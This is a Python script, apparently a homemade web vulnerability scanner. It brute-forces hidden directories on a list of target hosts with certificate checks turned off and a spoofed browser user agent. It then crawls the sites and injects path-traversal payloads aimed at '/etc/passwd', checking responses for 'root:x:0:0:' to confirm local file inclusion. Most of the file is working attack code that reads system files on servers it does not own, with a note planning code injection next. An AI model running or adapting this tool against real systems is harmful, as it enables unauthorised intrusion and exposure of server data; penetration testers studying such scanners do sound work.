import sys
import socket
import requests
import urllib.request
import ssl
import json
import scrapy
from scrapy.crawler import CrawlerProcess

resultList = open("result.txt", "w")
scrapList = []
testList = [
"?file=../../../../../../etc/passwd%00",
"?file=../../../../../../etc/passwd%2500",
"?file=../../../../../../etc/passwd",
"?file=../../../../../../../../../../../../../../../../../../../../etc/passwd%00",
"?file=../../../../../../../../../../../../../../../../../../../../etc/passwd%2500",
"?file=../../../../../../../../../../../../../../../../../../../../etc/passwd"]
lookFor = "root:x:0:0:"

class A3Spider(scrapy.Spider):
	name = "a3"

	def parse(self, response):
		#TODO: check if need login
		print(response)
		# parse for lfi	
		for testThis in testList:
			testFileInclusion = response.urljoin(testThis)
			print(testFileInclusion)
			#the fuck is this shit that doesn't let you 
			#return ints or booleans or just about anything useful?
			yield scrapy.Request(testFileInclusion, callback=self.parseForFileInclusion)

		#TODO: find input tags and try code injection

		# follow links
		nextLinks = response.css('a::attr(href)').extract()
		if nextLinks is not None:
			for link in nextLinks:
				followLink = response.urljoin(link)
				yield scrapy.Request(followLink, callback=self.parse)
		
	def parseForFileInclusion(self, response):
		result = response.xpath('//text()').extract()
		if result is not None:
			for eachItem in result:
				if lookFor not in eachItem:
					pass
				else:
					#found
					url = str(response)
					url = url.replace("200 ", "")
					splitString = cleanUp(url)
					yield {
						'injection_point' : splitString[0],
						'param' : splitString[1], 
					}
					return
def tryConnect(url):
	ctx = ssl.create_default_context()
	ctx.check_hostname = False
	ctx.verify_mode = ssl.CERT_NONE	
	#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		req = urllib.request.Request(url)
		response = urllib.request.urlopen(req, context=ctx).code
		#print(response)
		#status = s.connect_ex((url,443))
		#s.close()
		if response == 200:
			print (url)
			scrapList.append(url)
			#resultList.write(url + "\n")
	except Exception as e: 
		pass
		#print(str(e))

def cleanUp(cleanThis):
	#need to test which one of tests for file inclusion we used
	#need to do it in this roundabout way because can't find out how to use scrapy
	#to store the original url.
	#whatever.
	for eachTest in testList:
		splitString = str.split(cleanThis, eachTest)
		if (len(splitString) == 2):
			splitString[1] = eachTest
			return splitString

def main():
	rhostDomains = []
	try:
		rhosts = sys.argv[1]
		rhostList = open(rhosts, "r").readlines()
		wordList = open("wordlist.txt", "r").readlines()
	except:
		print ("Something went wrong in args")
	for rhost in rhostList:
		rhost = rhost.strip()
		#brute force testing for possible hidden directories.
		for line in wordList:
			tryLink = rhost+"/"+line
			tryConnect(tryLink.strip())

		# allowed_domains need to be stripped of https://
		stripped = rhost.replace("https://", "")
		stripped = stripped.replace("http://", "")
		rhostDomains.append(stripped)

	process = CrawlerProcess({
		'USER_AGENT': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)',
		'FEED_FORMAT': 'json',
		'FEED_URI': 'result.json'
	})
	#empty file. Scrapy appends results by default.
	with open('result.json', 'w+'): pass

	#Starting crawler.
	process.crawl(A3Spider, allowed_domains=rhostDomains, start_urls=scrapList)
	process.start()

	print("Done!")
main()


